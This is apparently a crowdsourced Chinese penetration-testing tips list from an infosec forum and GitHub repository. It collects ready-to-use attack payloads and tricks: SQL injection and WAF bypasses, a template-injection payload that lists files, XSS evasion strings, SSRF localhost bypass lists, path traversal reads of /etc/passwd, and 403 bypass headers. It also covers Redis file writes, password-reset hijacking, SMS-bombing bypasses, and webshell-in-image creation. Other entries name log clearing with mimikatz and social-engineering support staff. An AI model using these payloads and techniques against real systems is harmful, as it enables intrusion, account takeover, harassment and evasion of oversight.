# 渗透测试Tips - Version1.3（后续进行分类，倒叙排列，以及美化格式，师傅们先将就一下~）

## 希望师傅们可以分享一些个人渗透测试Tips，提交方式在下面
### 转载请保留来源

## 更新日志
2021年01月20日 - 建立仓库，编写前言，更新渗透测试Tips 1-34 个技巧

2021年01月21日 - 整理来自tools师傅们留言的渗透测试Tips

2021年01月26日 - 整理了几天来自tools师傅们的留言以及个人的渗透测试Tips

2021年01月28日 - 整理更新了第38~48，所学习记录的渗透测试Tips

2021年01月29日 - 整理更新了第49~59，所学习记录的渗透测试Tips，以及来自Tools师傅们部分Tips

2021年02月04日 - 整理了一些师傅们留言贡献的渗透测Tips

2021年03月23日 - 整理更新了第60~66，所学习记录的渗透测试Tips


## 食用指南&前言

首发于tools，应各位师傅的支持以及建议，遂开了这个github，本着众人拾柴火焰高，你的一滴水，我的一滴水，最终汇聚成汪洋的渗透测试之海的想法，做一个集合渗透测试知识点，小技巧的知识库，方便大家学习，以及在实战中开拓思路，举一反三。

以下渗透测试Tips，主要用于发散思维，发散而聚合，最终可以在实战用应用出各种奇淫技巧，渗透测试个人理解本事也是一个尝试和思考的过程。

本仓库，我会不定时更新我所学到的，用到的小技巧，知识点。由于之前没有学习记录总结的好习惯，所以流失了好多知识点，小技巧。后面我会不定时持续更新，并且做好分类。

也恳请希望各位大佬师傅们，能随我一起更新一些小知识点，小技巧。不用是长篇大论，几句话描述一个小技巧/知识点即可，可以是文章中学习到的知识点，也可以是实战中遇到的有趣小技巧，也可以是国外一些BugbountyTips的翻译（建议带着原文地址，这样大家也可以各自分别学习原文思想）。

希望各位大佬师傅们，能分享一些觉得可以分享的一些小奇淫技巧~

对于个人或团队提交的渗透测试Tips，我会在每个Tips后面，以及文末署名提交人ID，师傅们提交的时候携带自己的ID。

备注：部分所学习的知识点，小技巧可能来自国外文章，通过自己理解整理的，如果大家不太明白，有的会给出地址，可以自己拿来学习~

## 具体提交渗透测试Tips方式如下：

1、本篇首发于Tools论坛，大家可以再Tools论坛该帖子下面留言，我会定时收集整理。
```
由于第一版不知道怎么没有编辑权限了，所以开了第二版，都可以留言，看到就整理出来
https://www.t00ls.net/thread-59411-1-1.html
https://www.t00ls.net/thread-59559-1-1.html
```

2、关注公众号"洞一CyberSecurity"，进行留言，格式：渗透测试Tips-xxxxxxxx。

![123.png](https://github.com/Power7089/PenetrationTest-Tips/blob/main/img/01cyber.jpg)

3、使用本仓库提交Issues，我会定时摘取整理，然后发布到该仓库。



前期先做聚合，等达到一定的量后，我会针对每一条Tips进行分类整理。

前辈师傅们请多多支持，一起做些有趣且有意义的小事情吧~

其他兄弟们也多多支持哦，天天为奉献的师傅们进行意念祈祷，天天祝福他/她们日进斗金不脱发，赢取白富美或高富帅。

更别忘了点个Star哦~


# 正文 - 渗透测试Tips

### **知己知彼，百战不殆**

1、如果提示缺少参数，如{msg：params error}，可尝使用字典模糊测试构造参数，进一步攻击。

2、程序溢出，int最大值为2147483647，可尝试使用该值进行整数溢出，观察现象。

3、403，404响应不灰心，尝试使用dirsearch等工具探测目录。

4、验证码简单绕过：重复使用，万能验证码（0000,8888），空验证码，验证码可识别（可用PKAV HTTP Fuzzer工具识别等）

5、短信轰炸绕过：手机号前加+86有可能会绕过，手机号输入邮箱，邮箱处输入手机号

6、如果验证码有实效，可尝试一段时间内重复发送获取验证码，因为有实效，所以有可能会延长验证码的时长。

7、SQL注入时，如果数据库是Mysql，可以尝试使用&&替换and，如：`' && '1'='1`，`' %26%26 '1'='1`。

8、SQL注入时，如果数据库是Mysql，waf过滤了`=`，可尝试用`like`替代。如：`and 1 like 1`

9、JWT格式在`http://jwt.calebb.net/`可以解密，前提是要知道秘钥，可以尝试构造任意数据，看他会不会有报错信息中携带秘钥信息，可以通过`https://github.com/firebase/php-jwt`生成JWT。JWT格式`header.payload.signature`

10、如果开放了redis服务（1234端口），可以尝试使用`/actuator/redis/info`语句看是否能读取敏感信息，如：`http://www.xxx.com:1234/actuator/redis/info`

11、Gitlab平台漏洞 - CVE-2020-10977

12、API接口处，可以自己构造参数，POST形式传参，可以尝试构造为JSON格式，记得添加`content-type: application/json`，一些可尝试参数，page，size，id。

13、手机发送短信时间限制的话，可以在手机号前尝试使用特殊字符，或空格。他的逻辑应该是这样的，用户输入手机号——>后端判断该手机号是否在30秒或者60秒内请求过——>如果没有，判断发送过来的手机号是够是11位的纯数字，如果不是，去掉非数字字符——>和数据库中的手机号比对，是够存在于数据库中，如果存在那么向该手机发送验证码。

14、图片验证码可设置为空，如：code=undefined

15、自动以验证码内容，观察Cookie中，参数中是否有发送给用户的内容，可以尝试更改，可以构造钓鱼链接。

16、模板注入，在{{xxx}}中输入的命令参数可被执行，如：

```
www.baidu.com/{{1+1}}
以Python为例，列出当前目录下所有文件的Payload：{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
```

17、信息收集，在搜狗搜索中选择`微信`可以搜索相关企业相关公众号资产。

18、在JS文件中搜索关键字`API`，`Swagger UI`等等，尝试寻找API接口地址。

19、swagger接口常见路径：

```
/swagger/
/api/swagger/
/swagger/ui/
/api/swagger/ui/
/swagger-ui.html/
/api/swagger-ui.html/
/user/swagger-ui.html/
/swagger/ui/
/api/swagger/ui/
/libs/swaggerui/
/api/swaggerui/
/swagger-resources/configuration/ui/
/swagger-resources/configuration/security/
```

20、swagger组件特征固定title：`Swagger UI`

21、403和401的绕过小技巧：

![c437ffd30e608e079623ee01cf1b4ca](https://github.com/Power7089/PenetrationTest-Tips/blob/main/img/403%E7%BB%95%E8%BF%87.jpg)

22、盲测目录是否存在，如果存在该目录可能会自动在URL末尾添加`/`补全。

23、Mysql中可以利用的空白字符有：`%09,%0a,%0b,%0c,%0d,%20,%a0`

24、获取账号：文库，QQ群，github泄露，借/租/买账号。

25、如果泄露阿里云的 AKSK，可以使用AKSKtools工具进一步利用。`https://xz.aliyun.com/t/8429  `    

26、如果遇见后台页面一闪而过，接着让你登录，一般使用了权限认证方式，可以用一下方式进行绕过，或者遇见401,403,302，都可以尝试使用以下方法：

```
一、GET /xxx HTTP/1.1 à403
Host: test.com
绕过：
GET /xxx HTTP/1.1 à200
Host: test.com
X-Original-URL: /xxx

二、GET /xxx HTTP/1.1 à403
Host: test.com
绕过：
GET /xxx HTTP/1.1 à200
Host: test.com
Referer: http://test.com/xxx

三、302跳转：拦截并drop跳转的数据包，使其停留在当前页面。
四、前端验证：只需要删掉对应的遮挡模块，或者是验证模块的前端代码。
```

27、gopher协议使用限制：

![640.png](https://github.com/Power7089/PenetrationTest-Tips/blob/main/img/GOpher%E5%8D%8F%E8%AE%AE.png)

28、一款生成gopher协议payload的工具：

```
https://github.com/firebroo/sec_tools
```

29、Dict协议写入流程：

```
1.写入内容；
 dict://127.0.0.1:6379/set❌test

2.设置保存路径；
dict://127.0.0.1:6379/config:set:dir:/tmp/

3.设置保存文件名；
dict://127.0.0.1:6379/config:set:dbfilename:1.png

4.保存。
dict://127.0.0.1:6379/save
```

30、CentOS 7系统利用suid提权获取Root Shell

```
https://www.freebuf.com/articles/system/244627.html
```

31、xss中<a>标签利用的payload：

```
<a href=javascript:alert(1)>xx</a>
```

32、XSS过滤了单引号，等号可以：

```
①、使用：String.fromCharCode(97,108,101,114,116,40,49,41);
为alert(1)，该方法输出的结果为字符串，可以使用eval()进行执行，即弹框操作
eval(String.fromCharCode(97,108,101,114,116,40,49,41));
②、atob函数：
eval(atob`YWxlcnQoMSk=`) 为 eval(atob`alert(1)`) 其中`为反引号
```

33、XSS过滤了单引号，等号以及圆括号，eval：

```
①、过滤了eval函数可以用其他函数去绕过，如：Function，constructor
Function`a${atob`YWxlcnQoMSk=`}```
``.constructor.constructor`a${atob`YWxlcnQoMSk=`}```
```

34、可使用下面命令查看是否处在docker虚拟机中

```
cat /proc/1/cgroup
```

35、万能密码试试`'=0#`

36、CORS漏洞验证，可以使用curl来验证：

```
curl https://www.xxxx.com -H "Origin: https://test.com" -I
检查返回包的 Access-Control-Allow-Origin 字段是否为https://test.com
```

37、在盲测目标系统是否为Shiro时，可以在Cookie中手动构造`rememebrMe=xxx`，如果返回包中Set-Cookie中存在`rememberMe=deleteMe`，则证明该系统使用了Shiro，因此可以进一步攻击。
38、使用正则获取网站中所包含的其他URL：

```
cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*

curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

39、常见的一些远程命令执行（RCE）参数，详情，请看dicts目录下的RCE-extentions.txt文件。

40、绕过SSRF防护的几个小方法：

```
A、绕过SSRF限制通过CIDR，如：
http://127.127.127.127
http://127.0.0.0

B、不完整的地址，如：
http://127.1
http://0

C、将地址结合在通过特殊字符结合在一起，如：
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib : 3.3.3.3

D、绕过解析器，如：
http://127.1.1.1:80\@127.2.2.2:80/

E、绕过localhost通过[::]，如：
http://[::]:80/
http://0000::1:80/

```

41、几个常用的Google语法：

```
inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
```

42、通过favicon的hash来对比相关联的两个网站：

```
脚本地址：https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/favihash.py
命令：python3 favihash.py -f https://target/favicon.ico -t targets.txt -s
```

43、一些本地包含参数，详情请看dicts目录下的LFI-extentions.txt文件。

44、在JavaScript文件中可以找一些隐藏的GET参数，比如：

```
首先，在js文件中找到一些变量，比如：var test="xss"
然后，可以尝试使用GET方法构造每一个参数，比如：
https://example.com/?test=”xsstest
本方法可能会发现一些XSS
```

45、使用github dorks帮助我们寻找一些敏感信息，比如：

```
extension:pem private
extension:ppk private
extension:sql mysql dump password
extension:json api.forecast.io
extension:json mongolab.com
extension:yaml mongolab.com
extension:ica [WFClient] Password=
extension:avastlic “support.avast.com”
extension:js jsforce conn.login
extension:json googleusercontent client_secret
“target.com” send_keys
“target.com” password
“target.com” api_key
“target.com” apikey
“target.com” jira_password
“target.com” root_password
“target.com” access_token
“target.com” config
“target.com” client_secret
“target.com” user auth
通过上述语法，可以搜索到一些敏感的私钥，一些SSH登录私钥，mysql的数据库密码，API key等等。
另外推荐一个脚本：https://github.com/techgaun/github-dorks
```

46、SSRF常见的参数，详情请看dicts目录下的SSRF-extensions.txt文件。

47、通过添加`.json`后缀，泄露一些敏感信息，比如：

```
一次正常请求：
GET /ResetPassword HTTP/1.1
{"email":"victim@example.com"}
响应：
HTTP/1.1 200 OK

添加.json后缀的请求：
GET /ResetPassword.json HTTP/1.1
{"email":"victim@example.com"}
响应：
HTTP/1.1 200 OK
{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-edc8a"}
原链接：https://twitter.com/SalahHasoneh1/status/1293918353971531776
```

48、如果响应为401，可以试试在请求头中添加`X-Custom-IP-Authorization: 127.0.0.1`

49、利用火绒剑，配合微信发语音的方式，可以获取该人的登录IP。

50、目录穿越，敏感文件读取一些Payload：

```
\..\WINDOWS\win.ini
..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
.?\.?\.?\etc\passwd
../../boot.ini
%0a/bin/cat%20/etc/passwd
\\&apos;/bin/cat%20/etc/passwd\\&apos;
..%c1%afetc%c1%afpasswd
```

51、在访问admin路径面板时可以通过添加`%20`，来绕过，具体如下：

```
target.com/admin –> HTTP 302 (重定向到登录页面)
target.com/admin%20/ -> HTTP 200 OK
target.com/%20admin%20/ -> HTTP 200 OK
target.com/admin%20/page -> HTTP 200 OK
```

52、在重置密码的地方，可以尝试添加另外一个次要的账号，比如，手机号，邮箱号等等，比如：

```
a、构造两个参数：
	email=victim@xyz.tld&email=hacker@xyz.tld
b、使用抄送方式:
	email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
c、使用分隔符：
	email=victim@xyz.tld,hacker@xyz.tld
	email=victim@xyz.tld%20hacker@xyz.tld
	email=victim@xyz.tld|hacker@xyz.tld
d、不使用域名：email=victim
e、不使用顶级域名：email=victim@xyz
f、JSON情况：
{"email":["victim@xyz.tld","hacker@xyz.tld"]}
```

53、如果有利用邮箱重置密码功能的情况，而且还是JSON传输的情况下，使用SQLmap跑注入，可以将`*`（星号）放在`@`之前，比如：

```
{“email”:”test*@xxx.com”}
或者在*（星号）这个地方进行手注
原因大家可以看这里：https://tools.ietf.org/html/rfc3696#section-3

原文链接：https://www.infosecmatter.com/bug-bounty-tips-7-sep-27/#2_bypass_email_filter_leading_to_sql_injection_json
```

54、可以获取目标站点的`favicon.ico`图标的哈希值，然后配合shodan进行目标站点资产收集，因为每个目标站点的`favicon.ico`图标的哈希值可能是固定值，因此可以通过该方法从shodan，fofa等等去寻找更多资产。简单的用法：

```
#python 3
import mmh3 
import requests
import codecs
response = requests.get("https://www.baidu.com/favicon.ico")
favicon = codecs.encode(response.content,"base64")
hash = mmh3.hash(favicon)
print(hash)

或使用下面这个github项目：
https://github.com/devanshbatham/FavFreak

shodan搜索语句：http.favicon.hash:哈希值
fofa搜索语句：icon_hash="-247388890"（但仅限于高级用户使用）

原文链接：https://www.infosecmatter.com/bug-bounty-tips-8-oct-14/#8_database_of_500_favicon_hashes_favfreak
```

55、绕过403和401的小技巧：

```
a、添加以下请求头，比如：X-Originating-IP, X-Remote-IP, X-Client-IP, X-Forwarded-For等等；有可能会有一些白名单IP地址可以访问这些敏感数据。

b、如果使用GET方法访问某些路径，返回403，可以先访问允许访问的路径，然后在请求头中，添加下面的头：
X-Original-URL: /admin
X-Override-URL: /admin
X-Rewrite-URL: /admin

c、可以使用下面这些Payload试试
/accessible/..;/admin
/.;/admin
/admin;/
/admin/~
/./admin/./
/admin?param
/%2e/admin
/admin#

原文链接：https://www.infosecmatter.com/bug-bounty-tips-8-oct-14/#11_tips_on_bypassing_403_and_401_errors
```

56、如果访问`/.git`目录返回403，别忘了进一步访问下面的目录，比如：`/.git/config`

57、使用通配符绕过WAF，如果WAF拦截了RCE，LFI的payload，我们可以尝试使用通配符来绕过，比如：

```
/usr/bin/cat /etc/passwd ==  /???/???/c?t$IFS/?t?/p?s?wd
? = 任意的单个字符
* = 任意字符串，也包含置空的字符串
通配符在常见的系统中都适用，另外我们可以使用$IFS特殊变量取代空白
$IFS = 内部字段分隔符 = [space], [tab] 或者 [newline]

cat /etc$u/p*s*wd$u

小例子，执行/bin/cat /etc/passwd的写法：
/*/?at$IFS/???/???swd
/****/?at$IFS/???/*swd
/****/?at$IFS/???/*******swd

原文地址：https://www.infosecmatter.com/bug-bounty-tips-9-nov-16/#8_waf_bypass_using_globbing
```

58、绕过403的一个BurpSuit插件，地址：

```
https://github.com/sting8k/BurpSuite_403Bypasser
```

59、SSRF bypass列表，基于localhost（127.0.0.1），如下：

```
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
http://②⑧⑤②⓪③⑨①⑥⑥:80/
http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/
http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/
http://0xd8.0x3a.0xd6.0xe3
http://0xd83ad6e3
http://0xd8.0x3ad6e3
http://0xd8.0x3a.0xd6e3
http://0330.072.0326.0343
http://000330.0000072.0000326.00000343
http://033016553343
http://3627734755
http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
http://216.0x3a.00000000326.0xe3

原文链接：https://www.infosecmatter.com/bug-bounty-tips-10-dec-24/#13_ssrf_bypass_list_for_localhost_127001
```



60、对于Apache shiro的CVE-2020-17523的未授权访问，是由于Spring+shiro结合造成的漏洞，可在路径后面添加`%20`，尝试访问该路径内容，造成未授权访问操作。

61、在一些验证码登录，找回密码等地方需要输入手机号，邮箱号的话，尝试配合SQL注入联合查询方式，填写可控手机号，实际情况实际分析。

62、密码爆破不如意，试试"密码喷洒攻击（Password Spray Attack）"法，多来收集用户名。

63、Exchange的下的目录以及功能介绍：

```
/autoDiscover/	自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。
/ecp/“Exchange Control Panel”		Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台
/eWS/“Exchange Web Services”		Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互
/mapi/		Outlook连接Exchange的默认方式，在2013和2013之后开始使用，2010 sp2同样支持
/microsoft-Server-ActiveSync/		用于移动应用程序访问电子邮件
/OAB/“Offline Address Book”		用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担
/owa/“Outlook Web APP”		Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等
/powerShell/	用于服务器管理的Exchange管理控制台
/Rpc/	早期的Outlook还使用称为Outlook Anywhere的RPC交互
```

64、针对于Exchange的账号格式，可以尝试：`domain\username、domian.com\username、username`

65、一个验证域名是否使用了Exchange的脚本：`https://github.com/vysecurity/checkO365`

66、使用云函数的多出口特性，可以将其作为代理池来用。思路大概为：

```
流程：浏览器请求数据 -> 编写代理 -> 通过代理将数据传给api网关 -> api网关触发云函数并将参数作为event传入进云函数内 (然后反向流程将数据返回到浏览器中)
所以我们大致编写代码步骤为：
1、编写云函数，使用api网关做触发器，云函数主要处理api网关传来的数据，再将访问返回的数据包传会给api网关
2、编写代理代码，主要接收浏览器传来的数据，并将数据整理传给api网关，然后回到第一步。
注：这是一个思路，具体实现不局限于此，各位大佬各显神通吧~
```


----------------------------------------

### 2021年01月21日 - 更新分界线，整理了来自一些师傅们留言贡献的渗透测试Tips：

1、至于登陆后台的网站，如果有重置密码功能，但被禁用了，可以找该公司技术qq群，假装用户忘记密码，提重置密码需求，让开通功能，可以验证下是否有任意密码重置漏洞。Author By：六六

2、如果遇见后台页面一闪而过，接着让你登录，一般使用了权限认证方式:
 三、302跳转：拦截并drop跳转的数据包，使其停留在当前页面。 这个操作我每次试都是不成功的，但是可以修改返回的302为200，然后删除掉Location字段。Author By：Jokong

3、任意文件下载：/porc/self/cmdline --当前进程的cmdline参数，/var/lib/mlocate/mlocate.db --全文件路径。Author By：phage

4、容易发生短信轰炸的几个业务场景以及绕过方法：Author By：登登登Y

```
①：登录处 ②：注册处 ③：找回密码处 ④：绑定处 ⑤：活动领取处 ⑥：独特功能处 ⑦：反馈处
一般绕过限制方法：
手机号码前后加空格，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等
修改cookie，变量，返回
138888888889   12位经过短信网关取前11位，导致短信轰炸
```

5、注入的时候可以试试--%0a union --%0a select 尝试绕过。Author By：zhaoze

6、注入的时候，多看order by,group by,{$var}。Author By：oops33

7、手机号前加若干`+`会造成短信轰炸。Author By：ptgeft

8、如果在旁站中发现短信验证码在response中出现，可以试试主站或者其他站点中验证码是否通用。Author By：Alex125

9、获取短信验证码时，用逗号隔开两个手机号，有可能两个手机号能获取到同一个验证码。Author By：Scorpion

---------------------------------------

### 2021年01月26日 - 更新分界线，整理了来自一些师傅们留言贡献的渗透测试Tips：

1、测试注入 `and ord(0x1)` ->true，`and ord(0x0)` ->false。Author By：oops33

2、遇到文件读取漏洞，除了读取配置文件，还可以尝试读取网站文件，来进行代码审计，说不定就有开发疏忽的漏洞在源代码里。Author By：iwtbhero

3、使用python快速开启http服务器：Author By：ffffffff0x

```
基于python2.x，命令如下：
python -m SimpleHTTPServer 8000
# 在当前目录起个 8000 端口的 HTTP 服务

基于python3.x，命令如下：
python -m http.server 8000
```

4、渗透时尽量不要暴露自己的 IP 地址，挂代理是必须的。Author By：ffffffff0x

- linux 下要查看自己终端是否走代理可以 curl https://ifconfig.me/ 看下返回的 IP 地址
- windows 就直接访问 https://ifconfig.me/ 即可

5、整理字典时，推荐用linux下的工具快速合并和去重。Author By：ffffffff0x

```
cat file1.txt file2.txt fileN.txt > out.txt
sort out.txt | uniq > out2.txt
```

------------
### 2021年01月29日 - 更新分界线，整理了来自一些师傅们留言贡献的渗透测试Tips：

1、注入时使用url编码对&&和||编码可以绕过一些拦截。例如：Author By：jettt

```
1' and 1=1--+
1' %26%26 True--+
同理其他编码也可以试一个遍。
```

2、信息收集的时候可以使用fofa查看证书看是否是真实IP 语法 cert="baidu.com"。Author By：zhaoze

3、将普通图片1.jpg 和 木马文件shell.php ,合并成木马图片2.jpg：Author By：Lstarx

 ```
$ copy /b 1,jpg+shell.php 2.jpg
 ```

4、mimikatz小功能：Author By：Rive丶

 ```
多用户登录3389：ts::multirdp
 清除日志：event::drop
 粘贴板信息：misc::clip
 ```
 
 ----------------------------------------
### 2021年02月04日 - 更新分界线，整理了来自一些师傅们留言贡献的渗透测试Tips：

**以下来自xinxin999师傅的贡献：**

1、{“id”:111} --> 401 Unauthriozied    {“id”:[111]}-->200 OK   {“id”:{“id”:111}} --> 200 OK  {“id”:{“id”:[111]}} --> 200 OK

2、测试注入的时候,可以psot/get更换，自定义一些参数，删除一些参数，加上分块，以及burp有时候有这种口口符号，可以删除在测payload。

3、wp的站，如果扫到，xmlrpc这个文件，我们可以借鉴这篇文章https://blog.csdn.net/u012206617/article/details/109002948

4、看见同行的马，我们可以加一些参数让其密码溢出来。例如a.asp?profile=a

5、如果注入出的md5只有31位，可以去掉前8位和后8位，用中间的16位



**以下来自Wafer师傅的贡献：**

6、快速web路径，sql注入下找路径。

```
dir /s /b e:\”Web.config" 
 type e:\b2cexam\web.config  
```

7、列出网站物理路径

```
%systemroot%\system32\inetsrv\appcmd.exe list vdir 
```

8、列出机器所有盘符(禁止访问的盘无法获取)

```
 wmic logicaldisk where drivetype=3 get deviceid
```



**以下来自lidasimida师傅的贡献：**

9、burpsuite的intruder模块的爆破功能：

ssrf绕过举例：http://127.0.0.1:0~65535，
有时间的话可以尝试爆破多个端口来爆破，里面的地址也可以更改为已知确认的内网地址。还有就是http://127.0.0.1/a
的a目录进行枚举，有些是可以枚举成功的，有些是枚举不了的，这个a目录最好为已知的403目录，如果403绕不过去可以搜集为临时字典，然后使用爆破。

目录穿越绕过举例：不一定是/../etc/password就可以绕过，建议可以配置字典，第一个为/..第二个为/../..以此类推来爆破，爆破还可以选中intruder——payloads——payload encoding，编码爆破也是可以的，目录穿越来爆破还是不错的。

字典组合模块：payloads——payload sets——custom iterator

10、dnslog外带注入

shiro反序列化、fastjson反序列化、sql注入外带注入、xss外带注入、内网漫游（nginx的反向代理会导致内网漫游，在请求头添加dnslog地址即可）

11、密码解密小技巧

输入同一个密码多次抓包发现密码固定值加密，可以搜集多个弱口令进行用户名爆破

输入同一个密码多次抓包发现密码不是固定值加密，可以将多组密码对比，可能奇数位或偶数位一致，之前审计一组加密代码发现，减去前4位和后8位共12位随机数之后，再减去奇数位的随机数，得到偶数位的编码格式为base64编码。（https://www.freebuf.com/articles/web/261440.html）

12、信息收集

置换请求头，插件User-Agent switch，可以更改请求方式访问Android、iPhone、ipad等可以访问的页面，可能会访问到浏览器访问不到的信息。

白马单绕过插件：X-Forwarded-For Header，建议测试后关闭，有些网站你勾选了会无法正常访问。

13、上传的请求包有两个请求参数同为php，修改其中一个为1.jpg，另外一个为1.php

将文件后缀做个编码尝试，看看后端会不会有解码，或者单独将文件后缀一个字母或两个字母做编码，编码可以是十六进制、Unicode编码、base64编码单独。

在1.jpg.php的.php前面插入多行换行符或者垃圾数据，插入多个/试试。文件后缀使用通配符*或者?或者其他。

-----------------------

14、 信息收集的时候可以使用fofa查看证书看是否是真实IP 语法 cert="baidu.com"。Author By：zhaoze

---------------------------------------

# 贡献个人（排名不分先）

**感谢以下师傅们做出的杰出贡献，本年对最佳师傅们~**

六六，Jokong，phage，登登登Y，zhaoze，oops33，ptgeft，Alex125，Scorpion，iwtbhero，ffffffff0x，Lstarx，jettt，Rive丶，xinxin999，Wafer，lidasimida	

# 贡献团队（根据贡献个数进行排名）

洞一CyberSecurity



